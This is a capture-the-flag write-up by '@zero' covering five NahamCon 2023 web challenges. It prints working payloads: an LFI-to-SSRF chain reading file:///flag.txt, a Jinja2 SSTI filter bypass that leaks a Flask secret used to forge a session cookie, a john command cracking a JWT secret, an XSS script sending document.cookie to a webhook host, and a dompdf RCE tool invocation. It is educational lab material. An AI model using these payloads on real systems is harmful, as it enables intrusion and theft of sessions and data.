---
title: "nahamconCTF/2023 |  Web challenges "
date: 2022-09-21
# weight: 1
tags: ["nahamcon", "CTFS", "Web", "2023"]
author: "@zero"
# author: ["Me", "You"] # multiple authors
showToc: false
TocOpen: false
draft: false
hidemeta: false
comments: true
description: "Solving nahamconCTF/2023 Web challenges."
canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "https://i.ytimg.com/vi/ttsFRYkL8wQ/maxresdefault.jpg" # image path/url
    alt: "nahamcon-CTF" # alt text
    caption: "<text>" # display caption under cover
    relative: false # when using page bundles set this to true
    hidden: true # only hide on current single page
---
## Museum Challenge 

When accessing the web app, the following page is displayed![enter image description here](https://i.imgur.com/xF8hVwV.png)
While attempting to view an image using the following URL format: `http://challenge.nahamcon.com:31368/browse?artifact=angwy.jpg`, I noticed that the application calls the image through the `?artifact` parameter. Exploiting this behavior, I attempted a Local File Inclusion (LFI) attack by modifying the URL to access sensitive files such as `/.etc/passwd`. However, I encountered an obstacle as I couldn't directly read the flag. As a result, I started investigating the location of the application by exploring `/proc/self/cmdline`.

![enter image description here](https://i.imgur.com/QzxBY50.png)
reading source of application 

/home/museum/app.py


```
from flask import Flask, request, render_template, send_from_directory, send_file, redirect, url_for
import os
import urllib
import urllib.request

app = Flask(__name__)

@app.route('/')
def index():
    artifacts = os.listdir(os.path.join(os.getcwd(), 'public'))
    return render_template('index.html', artifacts=artifacts)

@app.route("/public/<file_name>")
def public_sendfile(file_name):
    file_path = os.path.join(os.getcwd(), "public", file_name)
    if not os.path.isfile(file_path):
        return "Error retrieving file", 404
    return send_file(file_path)

@app.route('/browse', methods=['GET'])
def browse():
    file_name = request.args.get('artifact')

    if not file_name:
        return "Please specify the artifact to view.", 400

    artifact_error = "<h1>Artifact not found.</h1>"

    if ".." in file_name:
        return artifact_error, 404

    if file_name[0] == '/' and file_name[1].isalpha():
        return artifact_error, 404
    
    file_path = os.path.join(os.getcwd(), "public", file_name)
    if not os.path.isfile(file_path):
        return artifact_error, 404

    if 'flag.txt' in file_path:
        return "Sorry, sensitive artifacts are not made visible to the public!", 404

    with open(file_path, 'rb') as f:
        data = f.read()

    image_types = ['jpg', 'png', 'gif', 'jpeg']
    if any(file_name.lower().endswith("." + image_type) for image_type in image_types):
        is_image = True
    else:
        is_image = False

    return render_template('view.html', data=data, filename=file_name, is_image=is_image)

@app.route('/submit')
def submit():
    return render_template('submit.html')

@app.route('/private_submission_fetch', methods=['GET'])
def private_submission_fetch():
    url = request.args.get('url')

    if not url:
        return "URL is required.", 400

    response = submission_fetch(url)
    return response

def submission_fetch(url, filename=None):
    return urllib.request.urlretrieve(url, filename=filename)

@app.route('/private_submission')
def private_submission():
    if request.remote_addr != '127.0.0.1':
        return redirect(url_for('submit'))

    url = request.args.get('url')
    file_name = request.args.get('filename')

    if not url or not file_name:
        return "Please specify a URL and a file name.", 400

    try:
        submission_fetch(url, os.path.join(os.getcwd(), 'public', file_name))
    except Exception as e:
        return str(e), 500

    return "Submission received.", 200

if __name__ == '__main__':
    app.run(debug=False, host="0.0.0.0", port=5000)
```
To exploit the `/private_submission_fetch` and `/private_submission` endpoints, you need to provide specific parameters. Based on the code you mentioned, the following payload can be constructed:

The URL parameter for `/private_submission_fetch` should be set to `http://127.0.0.1:5000/private_submission?url=file:///flag.txt&filename=test.txt`. This payload aims to visit the localhost (`127.0.0.1`) and access the `/private_submission` endpoint with the `url` parameter set to `file:///flag.txt` to read the flag file, and the `filename` parameter can be set to any desired value (in this case, `test.txt`).
``http://challenge.nahamcon.com:31368/private_submission_fetch?url=http%3A%2F%2F127.0.0.1%3A5000%2Fprivate_submission%3Furl%3Dfile%3A%2F%2F%2Fflag.txt%26filename%3Dtest.txt``



![enter image description here](https://i.imgur.com/xF8hVwV.png)


by opening test.txt will get the flag 
![enter image description here](https://i.imgur.com/re4xroQ.png)




## Obligatory - Medium 

sign up and log in  the web site looking to Task Created 

![enter image description here](https://i.imgur.com/4SPucDy.png)


After creating a task, the website displays a success message with the parameter "success" in the URL. For example, the URL might look like this: `http://challenge.nahamcon.com:30192/?success=Task%20created`.

I attempted to exploit the website's vulnerability to Server-Side Template Injection (SSTI) by injecting the expression `{{7*7}}` into the "success" parameter. As a result, the server processed the SSTI payload successfully, and the response displayed the value "49" (since 7 multiplied by 7 equals 49). This confirms the existence of an SSTI vulnerability.

Furthermore, I tried injecting the payload `{{config.items()}}` to retrieve information about the configuration. However, it seems that the application applies some filters or restrictions, preventing the complete execution of the payload.
![enter image description here](https://i.imgur.com/2kTIFmr.png)


great resource 
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti


The suggested payload involves replacing underscores (_) with the hexadecimal representation \x5f. The final payload would be as follows:
`{{self|attr("\x5f\x5fdict\x5f\x5f")}}`

This payload aims to access the `__dict__` attribute of the `self` object within the template context. By doing so, it retrieves the dictionary representing the attributes of the `self` object and renders it as the output in the template.


![enter image description here](https://i.imgur.com/eqbJvQ4.png)



We have a secret key: "&GTHN&Ngup3WqNm6q$5nPGSAoa7SaDuY" that needs to be used for signing. To sign a cookie value and obtain the desired output, we can use the following command:

`flask-unsign --sign --cookie "{'id':1}" --secret "&GTHN&Ngup3WqNm6q\$5nPGSAoa7SaDuY"



This command generates a signed value. In this case, the signed value is "eyJpZCI6MX0.ZJCZvA.Gv1dLHOlcliDKWFv8C1lehZT84o". By replacing the cookie value with this signed value, it should provide us with access to the flag.`
![enter image description here](https://i.imgur.com/dhha1rD.png)

## Marmalade 5
web challenge look like when entering any username 
![enter image description here](https://i.imgur.com/xSakPwD.png)
i noticed the web use jwt tokn trying common exploit but not works so i tried to genertate error give me this hint 
![enter image description here](https://i.imgur.com/zBC6IYu.png)
To brute force the remaining 5 characters using `john` and the `jwt.txt` file, you can use either of the following commands:

`john.exe jwt.txt --wordlist=wordlist.txt --format=HMAC-MD5`
or 
`john token --mask=fsrwjcfszeg?l?l?l?l?l --format=HMAC-MD5`

After running the command, you will obtain the remaining characters, which are `vsyfa`. To forge the correct token with the new secret, you need to replace the existing JWT token with the new one. The resulting token will be:

`
eyJhbGciOiAiTUQ1X0hNQUMifQ.eyJ1c2VybmFtZSI6ICJhZG1pbiJ9.fWg2jgheCvPc4WaNSmAVEQ==
`
Using this modified token, you can then proceed to achieve your desired goal or obtain the flag

![enter image description here](https://i.imgur.com/pfoAx44.png)


## Star Wars
after sign in blog page appear with commant section

![enter image description here](https://i.imgur.com/5RjLJya.png)
  
After attempting to comment, the command will be sent for admin review, potentially leading to XSS. The following payload, or another similar payload, can be utilized:
`<script> var i = new Image;
  i.src = "http://webhook/?" + document.cookie; </script>`
By inspecting the webhook, the admin's cookie can be identified. By replacing the cookie, the flag can be obtained. For further details, refer to the following link: [XSS Reflected Steal Cookie](https://github.com/R0B1NL1N/WebHacking101/blob/master/xss-reflected-steal-cookie.md).

## Stickers
This challenge the same machine i solved it in HTB once we open the challenge will get form need to complete then after complete the form will downlad the pdf 
![enter image description here](https://i.imgur.com/uGbp9u3.png)
after submit will get this request 

![enter image description here](https://i.imgur.com/l3Uiztk.png)



searhing for php pdf exploits and found this cool tool 
https://github.com/rvizx/CVE-2022-28368


python3 dompdf-rce.py --inject "GET request " --dompdf "challenge url "



rce and then the flag 

Thanks for Reading ..
